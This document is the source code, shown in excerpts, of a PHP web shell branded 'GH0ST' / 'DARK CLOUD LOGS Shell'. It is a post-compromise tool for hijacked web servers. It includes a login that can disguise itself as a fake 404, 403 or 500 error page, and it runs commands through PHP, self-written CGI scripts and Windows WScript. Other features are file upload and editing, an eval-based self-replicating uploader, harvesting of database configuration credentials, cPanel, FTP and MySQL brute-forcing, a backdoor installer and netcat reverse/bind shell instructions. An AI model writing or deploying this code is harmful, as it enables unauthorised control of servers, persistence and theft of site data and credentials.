<?php
/*
	Author: 	TH3 EL1T3 GH0ST-Team
	Telegram:  https://t.me/+nOzoQ_k9n9kzYWRl
	Github:     TH3EL1T3GH0ST
	Gmail:		th3el1t3gh0st@gmail.com
	OWNER:    GH0ST 
	USER:      @TH3EL1T3GH0ST
*/
...
define("__GH0ST_VERSION__", "4.1");
define("__GH0ST_UPDATE__", "2");
define("__GH0ST_CODE_NAME__", "Tesla");
define("__GH0ST_DATA_FOLDER__", "GH0ST_DATA");
define("__GH0ST_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__GH0ST_SECRET_KEY__", __GH0ST_POST_ENCRYPTION__?_GH0STSecretKey():'');
$GLOBALS['__GH0ST_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#0E304A",
		...
		"GH0ST+" => array(
			"key_color" => "#06ff0f",
			"multi_selector" => array(
				".GH0ST_plus" => "color: {color};font-weight: unset;",
			)
		),
...
$config = array('GH0STUser' => $GLOBALS['DB_NAME']['user'],'GH0STPass' => $GLOBALS['DB_NAME']['pass'],'GH0STProtectShell' => $GLOBALS['DB_NAME']['safemode'],'GH0STLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
...
if($config['GH0STLoginPage'] == 'gui'){
if(@$_COOKIE["GH0STUser"] != $config['GH0STUser'] && $_COOKIE["GH0STPass"] != md5($config['GH0STPass'])){
if(@$_POST["usrname"]==$config['GH0STUser'] && @md5($_POST["password"])==$config['GH0STPass']){
__GH0ST_set_cookie("GH0STUser", $config['GH0STUser']);
__GH0ST_set_cookie("GH0STPass", @md5($config['GH0STPass']));
...
<title>~ DARK CLOUD LOGSShell-v'.__GH0ST_VERSION__.'-'.__GH0ST_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="DARK CLOUD LOGS 2012" draggable="false" src="https://i.ibb.co.com/15JX7GQ/20251031-123133.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ DARK CLOUD LOGS Shell-v'.__GH0ST_VERSION__.'-'.__GH0ST_CODE_NAME__.' ~</b></font></th></tr>
...
}elseif($config['GH0STLoginPage']=='500'){
if(@$_COOKIE["GH0STPass"] != @md5($config['GH0STPass'])){
if(@md5($_POST["password"])==$config['GH0STPass']){
__GH0ST_set_cookie("GH0STUser", $config['GH0STUser']);
__GH0ST_set_cookie("GH0STPass", @md5($config['GH0STPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
...
}elseif($config['GH0STLoginPage']=='403'){
if(@$_COOKIE["GH0STPass"] != @md5($config['GH0STPass'])){
if(@md5($_POST["password"])==$config['GH0STPass']){
__GH0ST_set_cookie("GH0STUser", $config['GH0STUser']);
__GH0ST_set_cookie("GH0STPass", @md5($config['GH0STPass']));
...
}elseif($config['GH0STLoginPage']=='404'){
if(@$_COOKIE["GH0STPass"] != @md5($config['GH0STPass'])){
if(@md5($_POST["password"])==$config['GH0STPass']){
__GH0ST_set_cookie("GH0STUser", $config['GH0STUser']);
__GH0ST_set_cookie("GH0STPass", @md5($config['GH0STPass']));
...
function decrypt_post($str){
	if(__GH0ST_POST_ENCRYPTION__){
		$pwd = __GH0ST_SECRET_KEY__;
...
function _GH0STSecretKey(){
	$secret = @$_COOKIE["GH0STSecretKey"];
	if(!isset($_COOKIE["GH0STSecretKey"])){
		$secret = uniqid(mt_rand(), true);
		__GH0ST_set_cookie("GH0STSecretKey", $secret);
	}
	return $secret;
}
function GH0ST_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		return $GLOBALS["DB_NAME"]["color"][$target];
	}else{
		$target = $GLOBALS["__GH0ST_COLOR__"][$target];
		if(is_array($target)){
...
function GH0STCssLoadColors(){
	$css = "";
	foreach($GLOBALS['__GH0ST_COLOR__'] as $key => $value){
		if(!is_array($value)){
			$value = GH0ST_getColor($key);
			$css .= ".{$key}{color: {$value};}";
		}else{
			if(isset($value["multi_selector"])){
				foreach($value["multi_selector"] as $k => $v){
					$color = GH0ST_getColor($key);
...
echo '<script>';
foreach($GH0STx as $GH0ST){
if(in_array($GH0ST,$find))
continue;
echo 'GH0ST'.$GH0ST."_=";
}
echo '""</script>';
}}
function _GH0ST_cgicmd($cmd,$lang="perl",$set_cookie=false){
	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
		return "";
	}
	if(isset($_COOKIE["GH0STcgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["GH0STcgiapi"])){
			if(!@file_exists("GH0STcgiapi/".$_COOKIE["GH0STcgiapi"].".GH0ST")){
				$recreate = true;
				$lang = $_COOKIE["GH0STcgiapi"];
			}
		}
		if(!isset($_COOKIE["GH0STcgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				GH0STWriteTocgiapi("aspx.aspx",$aspx);
			}else{
				GH0STWriteTocgiapi($lang.".GH0ST",$source);
			}
			GH0STcgihtaccess('cgi', "GH0STcgiapi/");
		}else{
			$lang = $_COOKIE["GH0STcgiapi"];
		}
		$cgi_ext = ".GH0ST";
		...
		$cgi_url = __GH0ST_DATA_FOLDER__."/GH0STcgiapi/".$lang.$cgi_ext;
		...
		if($is_curl){
			...
			$data = _GH0ST_fsockopen($server,$uri,$cmd);
		}
		$out = "";
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__GH0ST_set_cookie("GH0STcgiapi", $lang);
			}
			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
				$out = $res[1];
			}
		}elseif($lang=="perl"){
			return _GH0ST_cgicmd($cmd_pure,"py",$set_cookie);
		}elseif($lang=="py"){
			return _GH0ST_cgicmd($cmd_pure,"bash",$set_cookie);
		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
			return _GH0ST_cgicmd($cmd_pure,"aspx",$set_cookie);
		}else{
			if($set_cookie){
				__GH0ST_set_cookie("GH0STcgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
function GH0STEx($in,$re=false,$cgi=true,$all=false){
	$data = _GH0ST_php_cmd($in,$re);
	if(empty($data)&&$cgi||$all){
		if($GLOBALS['sys']=='unix'){
			if(strlen(_GH0ST_php_cmd("whoami"))==0||$all){
				$cmd = _GH0ST_cgicmd($in);
				if(!empty($cmd)){
					return $cmd;
				}
			}
...
function _GH0ST_php_cmd($in,$re=false){
$out='';
try{
if($re)$in=$in." 2>&1";
...
$GH0STWs = new COM('WScript.shell');
$exec = $GH0STWs->exec('cmd.exe /c '.$_POST['GH0ST1']);
$stdout = $exec->StdOut();
$out=$stdout->ReadAll();
}
}catch(Exception $e){}
...
function _GH0ST_fsockopen($server,$uri,$post){
...
echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@GH0STGetCwd()) . "/<br />";
...
echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@GH0STGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
...
$solevisible = "cd '".addslashes(str_replace("\\","/",@GH0STGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
echo GH0STEx($solevisible);
}
echo'</pre>
</body></html>';
exit;}
...
$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@GH0STGetCwd());
if($GLOBALS['glob_chdir_false']){
	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @GH0STGetCwd());
}
if($GLOBALS['sys'] == 'win'){
...
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_GH0ST_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
...
define("GH0ST_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
function GH0SThead(){
$GLOBALS['__GH0ST_SHELL_CODE'] = '';
$GH0ST_uploader = '$x = base64_decode("'.$GLOBALS['__GH0ST_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("GH0ST_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($GH0ST_uploader)."'))");
if(!isset($_POST['ajax'])){
function GH0ST_GetDisable_Function(){
$disfun = @ini_get('disable_functions');
...
return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="GH0ST_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
}
function GH0STNum(){
$args = func_get_args();
$GH0STx = array();
...
var post_encryption_mode = ".(__GH0ST_POST_ENCRYPTION__?'true':'false').";";?>
var GH0ST1_="",GH0ST2_="",GH0ST3_="",GH0ST4_="",GH0ST5_="",GH0ST6_="",GH0ST7_="",GH0ST8_="",GH0ST9_="",GH0ST10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,GH0ST_can_add_opt=!1,GH0ST_before_do_action_id="",GH0ST_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_GH0ST_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],GH0ST_current_fm_id=1,GH0ST_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.GH0ST1.value=null!=t?t:"",d.mf.GH0ST2.value=null!=i?i:"",d.mf.GH0ST3.value=null!=l?l:"",d.mf.GH0ST4.value=null!=o?o:"",d.mf.GH0ST5.value=null!=r?r:"",d.mf.GH0ST6.value=null!=n?n:"",d.mf.GH0ST7.value=null!=s?s:"",d.mf.GH0ST8.value=null!=c?c:"",d.mf.GH0ST9.value=null!=f?f:"",d.mf.GH0ST10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=GH0ST_current_fm_id,t="a="+GH0STb64("FilesMan")+"&c="+GH0STb64(e.c.value)+"&GH0ST1="+GH0STb64(e.GH0ST1.value)+"&ajax="+GH0STb64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+GH0STb64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.GH0ST1.value)return!1;switch(GH0STloader("filesman_holder_"+a,"block"),e.GH0ST1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){GH0STloader("filesman_holder_"+a,"none"),GH0STFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",GH0STInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_GH0ST_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),GH0STClearAjax(l)):4==o.readyState&&200!=o.status&&(GH0STAjaxError(o.status,l,o.statusText,o.responseText),GH0STClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function GH0STClearAjax(e){_GH0ST_AJAX_.hasOwnProperty(e)&&delete _GH0ST_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=GH0ST_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",GH0STb64(e.a.value)),l.append("c",GH0STb64(e.c.value)),l.append("GH0ST1",GH0STb64(e.GH0ST1.value)),l.append("charset",GH0STb64(e.charset.value)),l.append("ajax",GH0STb64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_GH0ST_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":GH0STAjaxError(a.status,"upload_area",a.statusText,a.responseText),GH0STClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),GH0STShowNotification("File(s) uploaded successfully","Uploader"),GH0STFmngrContextRow()}else GH0STShowNotification("Folder has no permission...","Uploader","error");GH0STCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function GH0STCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,GH0ST1,GH0ST2,GH0ST3,GH0ST4,GH0ST5,GH0ST6,GH0ST7,GH0ST8,GH0ST9,GH0ST10,charset){var fm_id=0==GH0ST_fm_id?GH0ST_current_fm_id:GH0ST_fm_id,fm_id2=GH0ST_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=GH0ST_before_do_action_id;0==GH0ST_fm_id&&(set(a,c,GH0ST1,GH0ST2,GH0ST3,GH0ST4,GH0ST5,GH0ST6,GH0ST7,GH0ST8,GH0ST9,GH0ST10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=GH0ST2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(GH0STloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?GH0STloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=GH0ST2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),GH0STloader(g_action_id,"block"));for(var data="a="+GH0STb64(a)+"&c="+GH0STb64(d_mf_c)+"&",i=1;i<=10;i++)data+="GH0ST"+i+"="+GH0STb64(eval("d.mf.GH0ST"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+GH0STb64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+GH0STb64("true"),"FilesTools"==a&&"download"==GH0ST2){GH0STLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=GH0STb64("dlfile"),dl.c.value=GH0STb64(d_mf_c),dl.file.value=GH0STb64(GH0ST1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(GH0STLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){GH0STloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=GH0STGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,GH0STFmngrContextRow(),"function"==typeof GH0ST1&&GH0ST1(e),GH0STCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||GH0STloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&GH0STLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&GH0STColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(GH0STloader(GH0ST3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}GH0STloader(t,"none")},!1,GH0ST3))}function GH0STGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function GH0STloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="GH0STAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="GH0STteam-loader-text">DARK CLOUD LOGS</div><div class="GH0ST-ajax-error"></div><img src=\'http://solevisible.com/images/loader.svg\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),GH0STloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+GH0STb64("Sql")+"&GH0ST1="+GH0STb64("query")+"&GH0ST2=&c="+GH0STb64(c_)+"&charset="+GH0STb64("UTF-8")+"&type="+GH0STb64(n)+"&sql_host="+GH0STb64(i)+"&sql_login="+GH0STb64(l)+"&sql_pass="+GH0STb64(o)+"&sql_base="+GH0STb64(r)+"&sql_count="+GH0STb64(s)+"&current_mysql_id="+GH0STb64(a)+"&ajax="+GH0STb64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),GH0STloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function GH0ST_searcher_tool(e){switch(e){case"all":case"dirs":_GH0STSet(!0,"Disabled");break;case"files":_GH0STSet(!1,"php")}}function _GH0STSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function GH0STAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".GH0ST-ajax-error").innerHTML=e+" ( "+t+firewall+" )",GH0STShowNotification(t,"Ajax","error"))}}function GH0STInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){GH0STFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;GH0STSortMenuItems(["newtab"]),GH0STRightClickMenu(i,l),e.preventDefault()})})}function GH0STRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function GH0STSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function GH0STAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=GH0ST_ace_editors.editor;"eval"==i&&(l=GH0ST_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("GH0ST_ace_"+a+"_"+i,t,2012)}function GH0STAceChangeWrapMode(e,a){var t=GH0ST_ace_editors.editor;"eval"==a&&(t=GH0ST_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function GH0STAceChangeFontSize(e,a,t){var i=GH0ST_ace_editors.editor;"eval"==e&&(i=GH0ST_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("GH0ST_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=GH0ST_ace_editors.editor&&null!=GH0ST_ace_editors.editor){for(var a in GH0ST_ace_editors.editor)GH0ST_ace_editors.editor[a].destroy();GH0ST_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=GH0ST_ace_editors.eval){for(var a in GH0ST_ace_editors.eval)GH0ST_ace_editors.eval[a].destroy();GH0ST_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab 